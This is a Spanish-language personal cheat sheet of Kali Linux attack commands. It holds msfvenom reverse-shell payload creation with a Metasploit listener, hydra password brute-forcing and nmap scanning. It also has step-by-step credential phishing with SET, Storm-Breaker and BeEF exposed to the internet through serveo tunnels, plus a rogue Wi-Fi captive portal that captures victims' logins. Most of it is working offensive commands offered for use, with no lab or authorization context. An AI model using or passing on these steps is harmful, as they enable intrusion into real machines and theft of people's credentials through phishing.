++ kali-undercover ---> comando usado para tener la apariencia de Windows
--- Recordar tener instlado el paquete: sudo apt-get install kali-undercover

++ kali-undercover --off ---> comando usado para desactivar el modo undercover

++ hydra -l <usuario> -P <lista_de_contraseñas> <ip direccion> ---> comando basico hydra

++ nmap -sP <192.168.1.0/24> ---> muestra los dispositivos conectados a una red 

++ nmap -A <dirección> ---> Realiza un escaneo agresivo, detectando servicios, versiones y sistema operativo 

++ gpg -c <file> ---> Cifrar archivos 

++ msfvenom -p /windows/shell/reverse_tcp LHOST=<ip_local> LPORT=4444 -f exe > <nombre_programa>  ---> crear programa intrusion
---- msfconsole -q ---> escuchar programa intrusion
---- use exploit/multi/handler ---> comando para activar programa intrusion
---- set PAYLOAD windows/shell/reverse_tcp  ---> continuacion activar programa intrusion
---- set LHOST <ip_local> 
---- set LPORT 4444
---- run

++ Herramienta útil para phishing: blackeye
--- Enlace: https://github.com/majordmg/Blackeye-V3

++ Herramienta útil para phishing: zphisher
--- Enlace: https://github.com/htr-tech/zphisher

++ msfvenom 
--- Ejemplo de uso #1: msfvenom -p windows/shell_reverse_tcpe -o funny2.exe
--- Ejemplo de uso #2: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
--- Ejemplo de uso #3: nc -nlvp 443  (Nota: comando usado para escuchar)

++ theHarvester 
--- theHarvester -h (Muestra la información de ayuda referente a la utilidad)
--- theHarvester -d <nombre_del_dominio> -b <nombre_del_buscador_ejemplo_bing>
--- theHarvester -d <nombre_del_dominio> -b <nombre_del_buscador> -f <nombre_reporte.html>
--- xdg-open <nombre_reporte.xml>

++ whois
--- whois <nombre_dominio>
--- utilidad web: https://www.whois.com/

++ sherlock
--- Enlace del proyecto: https://github.com/sherlock-project/sherlock
--- sherlock --help (Muestra la información de ayuda referente a la utilidad)
--- Sintaxis de uso general: sherlock <usuario_1 usuario_2>
--- sherlock <usuario_1 usuario_2> --output results.txt (Guarda la información de salida en un archivo de texto)
--- cat results.txt (Ver la información de salida)

++ setoolkit
--- Escoger opcion <1-6>
--- Opcion 1: Social-Engineering-Attacks
--- Escoger opcion <1-10>
--- Opcion 2: Website Attack Vectors
--- Escoger opcion <1-7>
--- Opcion 3: Credential Harvester Attack Method
--- Escoger opcion <1-3>
--- Opcion 1: Web Templates
--- Presionar enter (dejar la ip por default)
--- Escoger opcion <1-3>
--- Opcion 2: Google
--- Abrir el navegador web e ir a la ip generada por el programa
--- Una vez ingresadas las credenciales las mismas estarán disponibles en el programa

++ Storm-Breaker
--- URL del proyecto: https://github.com/ultrasecurity/Storm-Breaker
--- ssh -R 80:localhost:2525 serveo.net (Para exponer nuestro servidor local al internet usando ssl tunneling)
--- Acceder al url generado
--- Acceder usando las credenciales <admin, admin>
--- Compartir un enlace generado 
--- Esperar a que el enlace generado sea abierto para obtener la información

++ Beefproject
--- URL del proyecto: https://github.com/beefproject/beef
--- Instalar el paquete
--- Una vez instalado ir a la ruta del programa
--- Ejecutar el comando: mousepad config.yaml
--- Verificar el apartado de credenciales
--- Quitar el # en el area de public
--- En esta misma area colocar en la seccion https la opcion true
--- Ejecutar el comando: ssh -R 80:localhost:3000 serveo.net
--- Copiar el url publico generado
--- Ejecutar el comando: mousepad config.yaml
--- Pegar el url publico generado en la seccion public, host
--- Remover del url la parte de https y guardar el archivo
--- Correr nuevamente beef desde el apartado raiz con el comando: ./beef
--- Abrir el url generado por el programa
--- Colocar las credenciales generadas
--- Dar clic en la seccion avanzada
--- En la seccion del url cambiar la ip por la ip copiada en el archivo mousepad config.yaml y dar enter
--- Ir al portal web de beef 
--- Ir a la seccion de commands
--- Ir a la seccion social eng.
--- Ir a la seccion google phishing
--- Dar clic en execute
--- El usuario debe proceder a ingresar sus credenciales
--- En la interfaz web de beef se procederán a ver las credenciales del usuario

++ Crear un punto de red wifi
--- Instalar los siguientes paquetes: apt install dnsmasq hostapd
--- Ejecutar el comando: airmon -ng check kill (Este comando para los procesos que puedan intervenir con el modo monitor)
--- Ejecutar el comando: mousepad /etc/apache2/sites-enabled/000-default.conf (Este comando nos permite editar el portal web de autenticacion)
--- Pegar los siguientes comandos en el archivo:
<Directory "/var/www/html">
RewriteEngine On
RewriteBase /
RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
RewriteRule ^(.*)$ http://%1/$1 [R=301,L]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ / [L,QSA]
</Directory>
--- Guardar el archivo
--- Ejecutar el siguiente comando: a2enmod rewrite && service apache2 start
(Permite habilitar los modulos de apache y reiniciar el servicio)
--- Ejecutar el siguiente comando: dnsmasq -C ~/dnsmasq.conf hostapd ~/hostapd.conf -B (Permite redireccionar el trafico al wifi que vamos a crear)
--- Ejecutar el siguiente comando: ifconfig wlan0 192.168.1.1/24 
--- Clonar el repositorio RougeWifi: https://github.com/s0meguy1/RougeWifi
--- Ir a la raiz del repositorio 
--- Ejecutar el comando: rm -rf wifi.sh
--- Ejecutar el comando: cp -r * /var/www/html/
--- Reiniciar el sistema
--- Ejecutar los siguientes comandos:
airmon-ng check kill
service apache2 start
dnsmasq -C /root/dnsmasq.conf  
hostapd /root/hostapd.conf -B
ifconfig wlan0 192.168.1.1/24
--- Ejecutar el comando:
tshark -i wlan0 -w capture.cap
--- El wifi aparecerá visible 
--- Una vez el objetivo ingrese al wifi e ingrese credenciales se puede ver lo capturado
--- Ejecutar el siguiente comando: wireshark capture.cap
--- Verificar la seccion protocolo (HTTP) y luego la seccion HTML, estando allí ubicar las credenciales




